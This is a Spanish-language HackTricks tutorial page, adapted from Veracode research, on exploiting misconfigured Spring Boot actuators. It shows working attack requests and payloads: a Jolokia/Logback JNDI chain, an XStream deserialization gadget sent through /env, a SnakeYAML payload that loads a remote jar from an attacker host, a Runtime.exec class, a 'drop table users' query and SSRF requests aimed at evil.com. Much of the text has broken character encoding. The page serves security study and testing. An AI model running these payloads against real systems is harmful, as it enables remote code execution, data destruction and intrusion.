# Spring Actuators

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Bypass de Autenticaci贸n en Spring**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**De** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Explotando Actuadores de Spring Boot

**copiado de** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

El Framework de Spring Boot incluye una serie de caracter铆sticas llamadas actuadores para ayudarte a monitorear y gestionar tu aplicaci贸n web cuando la despliegas en producci贸n. Destinados a ser utilizados para auditor铆a, salud y recolecci贸n de m茅tricas, tambi茅n pueden abrir una puerta oculta a tu servidor cuando est谩n mal configurados.

Cuando una aplicaci贸n de Spring Boot est谩 en ejecuci贸n, registra autom谩ticamente varios endpoints (como '/health', '/trace', '/beans', '/env', etc.) en el proceso de enrutamiento. Para Spring Boot 1 - 1.4, son accesibles sin autenticaci贸n, causando problemas significativos de seguridad. A partir de la versi贸n 1.5 de Spring, todos los endpoints, excepto '/health' y '/info', se consideran sensibles y est谩n asegurados por defecto, pero esta seguridad a menudo es desactivada por los desarrolladores de aplicaciones.

Los siguientes endpoints de Actuator podr铆an tener implicaciones de seguridad que conducen a posibles vulnerabilidades:

* /dump - muestra un volcado de hilos (incluyendo un rastreo de pila)
* /trace - muestra los 煤ltimos mensajes HTTP (que podr铆an incluir identificadores de sesi贸n)
* /logfile - muestra el contenido del archivo de registro
* /shutdown - apaga la aplicaci贸n
* /mappings - muestra todas las asignaciones de controladores MVC
* /env - proporciona acceso al entorno de configuraci贸n
* /actuator/env
* /restart - reinicia la aplicaci贸n
* /heapdump - Construye y devuelve un volcado de mont贸n de la JVM utilizada por nuestra aplicaci贸n

Para Spring 1x, est谩n registrados bajo la URL ra铆z, y en 2x se trasladaron a la base de ruta "/actuator/".

**Explotaci贸n:**

La mayor铆a de los actuadores solo admiten solicitudes GET y simplemente revelan datos de configuraci贸n sensibles, pero varios de ellos son particularmente interesantes para los cazadores de shells:

**1. Ejecuci贸n de C贸digo Remoto v铆a '/jolokia'**

Si la Biblioteca Jolokia est谩 en la classpath de la aplicaci贸n objetivo, se expone autom谩ticamente por Spring Boot bajo el endpoint del actuador '/jolokia'. Jolokia permite el acceso HTTP a todos los MBeans registrados y est谩 dise帽ado para realizar las mismas operaciones que puedes realizar con JMX. Es posible listar todas las acciones de MBeans disponibles utilizando la URL:

[**http://127.0.0.1:8090/jolokia/list**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

De nuevo, la mayor铆a de las acciones de MBeans solo revelan algunos datos del sistema, pero una es particularmente interesante:

![reloadByURL](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_jolokia.png)

La acci贸n '**reloadByURL**', proporcionada por la biblioteca Logback, nos permite recargar la configuraci贸n de registro desde una URL externa. Se podr铆a activar simplemente navegando a:[**http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Entonces, 驴por qu茅 deber铆a importarnos la configuraci贸n de registro? Principalmente por dos cosas:

1. La configuraci贸n tiene un formato XML, y por supuesto, Logback lo analiza con Entidades Externas habilitadas, por lo que es vulnerable a XXE ciego.
2. La configuraci贸n de Logback tiene la caracter铆stica ['Obtenci贸n de variables de JNDI'](https://logback.qos.ch/manual/configuration.html#insertFromJNDI). En el archivo XML, podemos incluir una etiqueta como '**\<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName" />**' y el atributo name se pasar谩 al m茅todo DirContext.lookup(). Si podemos suministrar un nombre arbitrario en la funci贸n .lookup(), ni siquiera necesitamos XXE o HeapDump porque nos da una completa **Ejecuci贸n de C贸digo Remoto**.

**C贸mo funciona:**

1\. Un atacante solicita la URL mencionada para ejecutar la funci贸n 'reloadByURL', proporcionada por la clase 'qos.logback.classic.jmx.JMXConfigurator'.

2\. La funci贸n 'reloadByURL' descarga una nueva configuraci贸n de [http://artsploit.com/logback.xml](http://artsploit.com/logback.xml) y la analiza como una configuraci贸n de Logback. Esta configuraci贸n maliciosa deber铆a tener el siguiente contenido:
```
<configuration>
<insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName" />
</configuration>
```
3\. Cuando este archivo se analiza en el servidor vulnerable, crea una conexi贸n al servidor LDAP controlado por el atacante especificado en el valor del par谩metro "env-entry-name", lo que lleva a la resoluci贸n de JNDI. El servidor LDAP malicioso puede devolver un objeto con tipo 'Reference' para desencadenar una **ejecuci贸n del bytecode suministrado** en la aplicaci贸n objetivo. Los ataques JNDI est谩n bien explicados en este [documento de investigaci贸n de MicroFocus](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf). La [nueva t茅cnica de explotaci贸n de JNDI](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) (descrita anteriormente en nuestro blog) tambi茅n funciona aqu铆, ya que Tomcat es el servidor de aplicaciones predeterminado en el Spring Boot Framework.

**2. Modificaci贸n de configuraci贸n v铆a '/env'**

Si las bibliotecas de Spring Cloud est谩n en el classpath, el endpoint **'/env'** te permite modificar las propiedades ambientales de Spring. Todos los beans anotados como '**@ConfigurationProperties**' pueden ser modificados y reasociados. Muchas, aunque no todas, las propiedades que podemos controlar est谩n listadas en el endpoint del actuator '/configprops'. De hecho, hay toneladas de ellas, pero no est谩 absolutamente claro qu茅 necesitamos modificar para lograr algo. Despu茅s de pasar un par de d铆as jugando con ellas encontramos esto:
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
Esta propiedad modifica la URL del servicio Eureka a un valor arbitrario. El servidor Eureka normalmente se utiliza como servidor de descubrimiento, y casi todas las aplicaciones de Spring Cloud se registran en 茅l y env铆an actualizaciones de estado. Si tienes suerte de tener Eureka-Client <1.8.7 en el classpath objetivo (normalmente est谩 incluido en Spring Cloud Netflix), puedes explotar la **vulnerabilidad de deserializaci贸n XStream** en 茅l. Todo lo que necesitas hacer es establecer la propiedad 'eureka.client.serviceUrl.defaultZone' a la URL de tu servidor ( [http://artsploit.com/n/xstream](http://artsploit.com/n/xstream)) a trav茅s de '/env' y luego llamar al endpoint '/refresh'. Despu茅s de eso, tu servidor deber铆a servir la carga 煤til de XStream con el siguiente contenido:
```markup
<linked-hash-set>
<jdk.nashorn.internal.objects.NativeString>
<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
<dataHandler>
<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
<is class="javax.crypto.CipherInputStream">
<cipher class="javax.crypto.NullCipher">
<serviceIterator class="javax.imageio.spi.FilterIterator">
<iter class="javax.imageio.spi.FilterIterator">
<iter class="java.util.Collections$EmptyIterator"/>
<next class="java.lang.ProcessBuilder">
<command>
<string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
</command>
<redirectErrorStream>false</redirectErrorStream>
</next>
</iter>
<filter class="javax.imageio.ImageIO$ContainsFilter">
<method>
<class>java.lang.ProcessBuilder</class>
<name>start</name>
<parameter-types/>
</method>
<name>foo</name>
</filter>
<next class="string">foo</next>
</serviceIterator>
<lock/>
</cipher>
<input class="java.lang.ProcessBuilder$NullInputStream"/>
<ibuffer></ibuffer>
</is>
</dataSource>
</dataHandler>
</value>
</jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>
```
Este payload de XStream es una versi贸n ligeramente modificada de la cadena de gadgets ImageIO JDK-only del [investigaci贸n de Marshalsec](https://github.com/mbechler/marshalsec). La 煤nica diferencia aqu铆 es el uso de **LinkedHashSet** para activar el m茅todo 'jdk.nashorn.internal.objects.NativeString.hashCode()'. El payload original utiliza java.lang.Map para lograr el mismo comportamiento, pero la configuraci贸n de XStream de Eureka tiene un [convertidor personalizado para mapas](https://github.com/Netflix/eureka/blob/master/eureka-client/src/main/java/com/netflix/discovery/converters/XmlXStream.java#L58) que lo hace inutilizable. El payload anterior no utiliza Maps en absoluto y se puede utilizar para lograr Ejecuci贸n de C贸digo Remoto sin restricciones adicionales.

Utilizando Spring Actuators, puedes explotar esta vulnerabilidad incluso si no tienes acceso a un servidor Eureka interno; solo necesitas un punto final "/env" disponible.

**Otras configuraciones 煤tiles:**

**spring.datasource.tomcat.validationQuery=drop+table+users** - te permite especificar cualquier consulta SQL, y se ejecutar谩 autom谩ticamente contra la base de datos actual. Podr铆a ser cualquier declaraci贸n, incluyendo insert, update o delete.

![Explotando Spring Boot Actuators Drop Table](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_drop\_table.png)

**spring.datasource.tomcat.url**=jdbc:hsqldb:[https://localhost:3002/xdb](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - te permite modificar la cadena de conexi贸n JDBC actual.

La 煤ltima parece excelente, pero el problema es cuando la aplicaci贸n que ejecuta la conexi贸n a la base de datos ya est谩 establecida, simplemente actualizar la cadena JDBC no tiene ning煤n efecto. Afortunadamente, hay otra propiedad que puede ayudarnos en este caso:

**spring.datasource.tomcat.max-active**=777

El truco que podemos usar aqu铆 es aumentar el n煤mero de conexiones simult谩neas a la base de datos. Entonces, podemos cambiar la cadena de conexi贸n JDBC, aumentar el n煤mero de conexiones y despu茅s de eso enviar muchas solicitudes a la aplicaci贸n para simular una carga pesada. Bajo la carga, la aplicaci贸n crear谩 una nueva conexi贸n a la base de datos con la cadena JDBC maliciosa actualizada. Prob茅 esta t茅cnica localmente contra Mysql y funciona de maravilla.

![Explotando Spring Boot Actuators Max Active](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_max\_active.png)

Aparte de eso, hay otras propiedades que parecen interesantes, pero, en la pr谩ctica, no son realmente 煤tiles:

**spring.datasource.url** - cadena de conexi贸n a la base de datos (utilizada solo para la primera conexi贸n)

**spring.datasource.jndiName** - cadena JNDI de bases de datos (utilizada solo para la primera conexi贸n)

**spring.datasource.tomcat.dataSourceJNDI** - cadena JNDI de bases de datos (no utilizada en absoluto)

**spring.cloud.config.uri**=[http://artsploit.com/](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - URL de configuraci贸n de spring cloud (no tiene ning煤n efecto despu茅s del inicio de la app, solo se utilizan los valores iniciales.)

Estas propiedades no tienen ning煤n efecto a menos que se llame al punto final '/restart'. Este punto final reinicia todos los ApplicationContext pero est谩 deshabilitado por defecto.

Hay muchas otras propiedades interesantes, pero la mayor铆a de ellas no tienen efecto inmediato despu茅s del cambio.

**N.B.** En Spring Boot 2x, el formato de solicitud para modificar propiedades a trav茅s del punto final '/env' es ligeramente diferente (utiliza formato json), pero la idea es la misma.

**Un ejemplo de la aplicaci贸n vulnerable:**

Si quieres probar esta vulnerabilidad localmente, he creado una [aplicaci贸n simple de Spring Boot en mi p谩gina de Github](https://github.com/artsploit/actuator-testbed). Todos los payloads deber铆an funcionar all铆, excepto por la configuraci贸n de la base de datos (a menos que la configures).

**Descubrimiento de caja negra:**

Una lista completa de actuadores predeterminados se puede encontrar aqu铆: [https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt). Ten en cuenta que los desarrolladores de aplicaciones pueden crear sus propios puntos finales utilizando la anotaci贸n @Endpoint.

**Actualizaci贸n mayo de 2019:**

Hay una forma m谩s confiable de lograr RCE a trav茅s de una modificaci贸n de las propiedades ambientales de Spring:
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml
```
Esta solicitud modifica la propiedad 'spring.cloud.bootstrap.location', que se utiliza para cargar la configuraci贸n externa y analizarla en formato YAML. Para que esto suceda, tambi茅n necesitamos llamar al endpoint '/refresh'.
```
POST /refresh HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
Cuando la configuraci贸n YAML se obtiene del servidor remoto, se analiza con la biblioteca SnakeYAML, que tambi茅n es susceptible a ataques de deserializaci贸n. El payload (yaml-payload.yml) puede generarse utilizando la investigaci贸n de Marshalsec mencionada anteriormente:
```
!!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
]]
]
```
La deserializaci贸n de este archivo desencadena la ejecuci贸n del constructor de 'ScriptEngineManager' con el 'URLClassLoader' suministrado. En resumen, conduce al m茅todo **'java.util.ServiceLoader#load(java.lang.Class\<S>, java.lang.ClassLoader)'**, que intenta encontrar todas las implementaciones de la interfaz 'ScriptEngineFactory' dentro de todas las bibliotecas en el classpath. Dado que podemos agregar una nueva biblioteca a trav茅s de 'URLClassLoader', podemos servir un nuevo 'ScriptEngineFactory' con el bytecode malicioso dentro. Para hacerlo, necesitamos crear un archivo jar con los siguientes archivos obligatorios: [yaml-payload.jar:/artsploit/AwesomeScriptEngineFactory.class](https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java) debe contener el bytecode actual, con el payload malicioso en el constructor.
```
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

public AwesomeScriptEngineFactory() {
try {
Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
} catch (IOException e) {
e.printStackTrace();
}
}
```
```markdown
[yaml-payload.jar:/META-INF/services/javax.script.ScriptEngineFactory](https://github.com/artsploit/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory) debe ser solo un archivo de texto que contenga una referencia completa a 'artsploit.AwesomeScriptEngineFactory', para que el ServiceLoader sepa d贸nde encontrar la clase: **artsploit.AwesomeScriptEngineFactory** Nuevamente, esta t茅cnica de explotaci贸n requiere que spring cloud est茅 en el classpath, pero en comparaci贸n con el payload de XStream de Eureka, funciona incluso en la 煤ltima versi贸n. Puedes encontrar el payload completo en mi proyecto de github: [yaml-payload](https://github.com/artsploit/yaml-payload).

## Env + H2 RCE

Consulta esta p谩gina para saber c贸mo explotar la combinaci贸n /env + H2: [https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

## SSRF en Spring Boot a trav茅s de la interpretaci贸n incorrecta del nombre de ruta <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

[**De esta investigaci贸n**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation): El framework de Spring acepta el car谩cter separador de par谩metros de matriz `;` antes de la primera barra del nombre de ruta HTTP:
```
```http
GET ;1337/api/v1/me HTTP/1.1
Host: target.com
Connection: close
```
En un escenario como el siguiente:

<figure><img src="../../.gitbook/assets/image (717).png" alt="" width="563"><figcaption></figcaption></figure>

Teniendo en cuenta que Spring permite cualquier car谩cter despu茅s del separador de par谩metros Matrix, tambi茅n es posible utilizar el car谩cter `@` para obtener un endpoint arbitrario.

A continuaci贸n se muestra un ejemplo de la solicitud de exploit:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
## M谩s Informaci贸n

* [https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html](https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html)
* [https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators](https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators)
* [https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep](https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep)

<details>

<summary><strong>Aprende AWS hacking de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
